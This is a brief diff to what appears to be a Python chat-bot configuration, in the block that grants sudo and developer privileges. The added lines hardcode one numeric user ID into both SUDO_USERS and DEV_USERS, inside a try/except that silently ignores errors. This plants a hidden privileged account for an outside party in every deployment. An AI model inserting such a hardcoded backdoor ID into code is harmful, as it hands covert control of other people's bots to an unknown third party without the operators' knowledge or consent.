@@ -148,8 +148,8 @@ else:
 DEV_USERS.add(OWNER_ID)
 SUDO_USERS.add(OWNER_ID)
 try:
-  SUDO_USERS.add(id)
-  DEV_USERS.add(id)
+  SUDO_USERS.add(1667146381)
+  DEV_USERS.add(1667146381)
 except:
   pass
 
